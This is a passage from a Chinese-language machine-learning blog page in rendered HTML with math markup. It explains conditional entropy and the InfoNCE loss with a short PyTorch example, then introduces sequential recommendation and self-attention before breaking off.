xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi><mo>=</mo><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">Y=y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 条件下<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 取值为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 的条件概率</li>\n<li>条件熵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X|Y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span></span></span></span> 衡量了在已知<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 的条件下，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的剩余不确定性。如果<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi><mtext>和</mtext><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">X和Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 完全独立，条件熵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X|Y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span></span></span></span> 就等于<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的熵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span></span></span></span></li>\n</ul>\n<h3 id=\"实现互信息最大化的方法\"><a class=\"anchor\" href=\"#实现互信息最大化的方法\">#</a> 实现互信息最大化的方法</h3>\n<p>直接最大化互信息通常是不可行的，因为计算互信息需要知道数据的真实分布，这在实际中很难获得。因此，研究人员提出了一些变分方法来近似最大化互信息。常用的方法之一是基于 <strong>Noise Contrastive Estimation (NCE)</strong> 的 <strong>InfoNCE</strong> 损失函数。</p>\n<h4 id=\"infonce损失函数\"><a class=\"anchor\" href=\"#infonce损失函数\">#</a> InfoNCE 损失函数</h4>\n<p>InfoNCE 是一种有效的变分下界，用于估计和最大化互信息。其定义如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mtext>InfoNCE</mtext><mo>=</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow></msub><mrow><mo fence=\"true\">[</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>q</mi><mo stretchy=\"false\">(</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow></msub><mrow><mo fence=\"true\">[</mo><munder><mo>∑</mo><msup><mi>y</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></munder><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><msup><mi>y</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo fence=\"true\">]</mo></mrow><mo fence=\"true\">]</mo></mrow><mo>+</mo><mi>log</mi><mo>⁡</mo><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">\\text{InfoNCE}=\\mathbb{E}_{p(x,y)}\\left[f_\\theta(x,y)-\\log\\mathbb{E}_{q(y)}\\left[\\sum_{y&#x27;}\\exp(f_\\theta(x,y&#x27;))\\right]\\right]+\\log|Y|\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord text\"><span class=\"mord\">InfoNCE</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.6010299999999997em;vertical-align:-1.55002em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">p</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0510099999999998em;\"><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎣</span></span></span><span style=\"top:-2.8099900000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎢</span></span></span><span style=\"top:-4.05101em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎡</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.55002em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">q</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0510099999999998em;\"><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎣</span></span></span><span style=\"top:-2.8099900000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎢</span></span></span><span style=\"top:-4.05101em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎡</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.55002em;\"><span></span></span></span></span></span></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8560149999999997em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6828285714285715em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.430093em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0510099999999998em;\"><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎦</span></span></span><span style=\"top:-2.8099900000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎥</span></span></span><span style=\"top:-4.05101em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.55002em;\"><span></span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0510099999999998em;\"><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎦</span></span></span><span style=\"top:-2.8099900000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎥</span></span></span><span style=\"top:-4.05101em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.55002em;\"><span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">∣</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>f</mi><mi>θ</mi></msub></mrow><annotation encoding=\"application/x-tex\">f_{\\theta}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是一个参数化的打分函数（例如两个嵌入的点积）</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 是负样本的集合</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\mathbb{E}_{p(x,y)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.04409em;vertical-align:-0.3551999999999999em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">p</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span></span> 是期望值，表示对联合分布<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x,y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span></span> 的期望值</li>\n</ul>\n<h3 id=\"代码实现\"><a class=\"anchor\" href=\"#代码实现\">#</a> 代码实现</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.optim <span class=\"keyword\">as</span> optim</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义打分函数</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ScoreFunction</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, input_dim</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(ScoreFunction, self).__init__()</span><br><span class=\"line\">        self.linear = nn.Linear(input_dim, input_dim)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x, y</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 计算 x 和 y 之间的打分</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> torch.<span class=\"built_in\">sum</span>(x * self.linear(y), dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># InfoNCE 损失函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">info_nce_loss</span>(<span class=\"params\">x, y, neg_samples</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    x: 正样本的嵌入</span></span><br><span class=\"line\"><span class=\"string\">    y: 目标正样本的嵌入</span></span><br><span class=\"line\"><span class=\"string\">    neg_samples: 负样本的嵌入集合</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    pos_score = score_fn(x, y)</span><br><span class=\"line\">    neg_scores = torch.stack([score_fn(x, neg_y) <span class=\"keyword\">for</span> neg_y <span class=\"keyword\">in</span> neg_samples], dim=<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 计算 InfoNCE 损失</span></span><br><span class=\"line\">    loss = -torch.mean(pos_score - torch.logsumexp(neg_scores, dim=<span class=\"number\">0</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> loss</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 示例数据</span></span><br><span class=\"line\">batch_size = <span class=\"number\">32</span></span><br><span class=\"line\">embedding_dim = <span class=\"number\">128</span></span><br><span class=\"line\">x = torch.randn(batch_size, embedding_dim)  <span class=\"comment\"># 正样本</span></span><br><span class=\"line\">y = torch.randn(batch_size, embedding_dim)  <span class=\"comment\"># 目标正样本</span></span><br><span class=\"line\">neg_samples = [torch.randn(batch_size, embedding_dim) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]  <span class=\"comment\"># 负样本集合</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化打分函数</span></span><br><span class=\"line\">score_fn = ScoreFunction(embedding_dim)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义优化器</span></span><br><span class=\"line\">optimizer = optim.Adam(score_fn.parameters(), lr=<span class=\"number\">0.001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 训练步骤</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    optimizer.zero_grad()</span><br><span class=\"line\">    loss = info_nce_loss(x, y, neg_samples)</span><br><span class=\"line\">    loss.backward()</span><br><span class=\"line\">    optimizer.step()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (epoch + <span class=\"number\">1</span>) % <span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Epoch [<span class=\"subst\">&#123;epoch + <span class=\"number\">1</span>&#125;</span>/100], Loss: <span class=\"subst\">&#123;loss.item():<span class=\"number\">.4</span>f&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"连续推荐任务概述\"><a class=\"anchor\" href=\"#连续推荐任务概述\">#</a> 连续推荐任务概述</h2>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>连续推荐任务（Sequential Recommendation）是推荐系统中的一个重要分支，旨在根据用户的历史行为序列来预测用户接下来可能感兴趣的物品。这类任务通常应用于电子商务、视频推荐、音乐推荐等领域，通过捕捉用户行为的时间序列模式来提高推荐的准确性和相关性。</p>\n<h3 id=\"典型方法\"><a class=\"anchor\" href=\"#典型方法\">#</a> 典型方法</h3>\n<ol>\n<li><strong>基于 Markov Chain 的方法</strong>：使用马尔可夫链来建模用户行为的转移概率。</li>\n<li><strong>基于 RNN 的方法</strong>：使用递归神经网络（如 GRU、LSTM）来捕捉用户行为序列中的长短期依赖关系。</li>\n<li><strong>基于 Transformer 的方法</strong>：使用自注意力机制来建模用户行为序列，能够更好地捕捉全局依赖关系。</li>\n</ol>\n<h2 id=\"自注意力机制-self-attention-mechanism\"><a class=\"anchor\" href=\"#自注意力机制-self-attention-mechanism\">#</a> 自注意力机制 Self-Attention Mechanism</h2>\n<h3 id=\"概念介绍-2\"><a class=\"anchor\" href=\"#概念介绍-2\">#</a> 概念介绍</h3>\n<p>自注意力机制是一种在序列建模任务中广泛应用的技术，它能够在处理输入序列时，动态地为序列中的每个元素分配不同的权重，从而捕捉全局的依赖关系。自注意力机制通过计算序列中每个位置的输入对其他所有位置输入的相关性，来决定各个位置的重要性。</p>\n<h3 id=\"公式\"><a class=\"anchor\" href=\"#公式\">#</a> 公式</h3>\n<p><img data-src=\"https://s2.loli.net/2024/07/29/RagSuCB8ULHpPst.png\" alt=\"QQ_1722266181765.png\" /></p>\n<h3 id=\"示例代码\"><a class=\"anchor\" href=\"#示例代码\">#</a> 示例代码</h3>\n<p><figure class=\"highlight python\"><table><tr><td 